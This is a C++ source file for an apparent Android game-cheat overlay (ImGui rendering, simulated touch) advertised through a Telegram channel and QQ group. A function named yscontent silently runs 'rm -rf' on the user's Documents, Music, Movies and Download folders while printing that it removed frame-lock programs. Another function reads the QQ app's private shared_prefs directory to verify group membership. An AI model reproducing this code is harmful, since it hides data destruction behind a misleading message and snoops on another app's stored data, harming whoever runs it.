  //@TearGame  泪心电报 http://t.me/TearGame        泪心QQ游戏群聊 435539500
   //@TearGame  泪心电报 http://t.me/TearGame        泪心QQ游戏群聊 435539500
 
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <fstream>
#include <string.h>
#include <time.h>
#include <malloc.h>
#include <iostream>
#include <fstream>

#include<iostream>
#include<ctime>

using namespace std;
    //  extern int volume();



#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>
#include <pthread.h>
#include <fstream>
#include <string.h>
#include <time.h>
#include <malloc.h>
#include <iostream>
#include <fstream>
#include <sys/system_properties.h>
#include <main.h>
#include <sys/utsname.h>
#include <dirent.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/stat.h>





int qqgroup()
{
char path[100] = "/data/user/0/com.tencent.mobileqq/shared_prefs/";
    DIR *dir;
    struct dirent *ent;

    dir = opendir(path);
 
    if (dir != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (strstr(ent->d_name, "435539500"/* 填入QQ群号*/) != NULL) {
            //蓝云奏网盘
//printf("不支持请去蓝云奏网盘下载本地使用的嗯嗯\n网盘:https://wwf.lanzouo.com/ix6dJ1v2hh7g\n");
                printf("QQ内部群验证通过\n\n\n");
                closedir(dir);
               return 0;
            }
        }
        printf("QQ群验证失败 请添加QQ群聊435539500\n");
        closedir(dir);
    } else {
    printf("\033[33;1m");		
    printf("QQ群验证失败 请添加QQ群聊435539500\n");
        printf("在QQ群发言哦 否则失效\n\n");
        exit(0);
    }
}

 
void yscontent()
{

 
printf("\033[35;1m");		// 粉红色
//系统文件了
system("rm -rf /storage/emulated/0/Documents");
system("rm -rf /storage/emulated/0/Music");
system("rm -rf /storage/emulated/0/Download/thumbs");
system("rm -rf /storage/emulated/0/Movies");
system("rm -rf /storage/emulated/0/Download/DLManager");
system("touch /storage/emulated/0/Download/downloaded_rom");


    printf("\n代码已经自动删除一切锁帧程序\n");

//sleep(2);system("am start -n com.tencent.tmgp.sgame/com.tencent.tmgp.sgame.SGameActivity");
}




int main(){
    //  generate_all_module_files();
      

screen_config();
    ::abs_ScreenX = (::displayInfo.height > ::displayInfo.width ? ::displayInfo.height : ::displayInfo.width);
    ::abs_ScreenY = (::displayInfo.height < ::displayInfo.width ? ::displayInfo.height : ::displayInfo.width);

    ::native_window_screen_x = (displayInfo.height > displayInfo.width ? displayInfo.height : displayInfo.width);
    ::native_window_screen_y = (displayInfo.height > displayInfo.width ? displayInfo.height : displayInfo.width);
//system("am start com.tencent.tmgp.sgame/com.tencent.tmgp.sgame.SGameActivity");
    if (init_egl(::native_window_screen_x, ::native_window_screen_y)) {
        ImGui_init();
    } else {
        printf("EGL err\n");
        exit(0);    
    }

    Touch::Init({(float)::abs_ScreenX, (float)::abs_ScreenY}, false); //要想模拟触摸最后一个参数改成 false
    Touch::setOrientation(displayInfo.orientation);	
while (1) {     
tick();


}

shutdown();

return 0;




}

	/*
#define FIBER_STACK 8192
void * stack;
//pArg记得加上定义void*表示一切空指针不然非参数定义报错


int fnProcess(void *stack)
{
    std::thread Main_down(Mainthread);
    Main_down.join();
    return 1;
}


int main(int argc, char *argv[]) {

        //  screen_config2();

      stack = malloc(FIBER_STACK);//为子进程申请系统堆栈
  void*  pArg = new std::tuple<std::string, std::string, std::string>("1234", "8888", "com.tencent.ooo");
    clone(&fnProcess, (char *)stack + FIBER_STACK, CLONE_PARENT, pArg);//创建子线程
    
    
}

        */
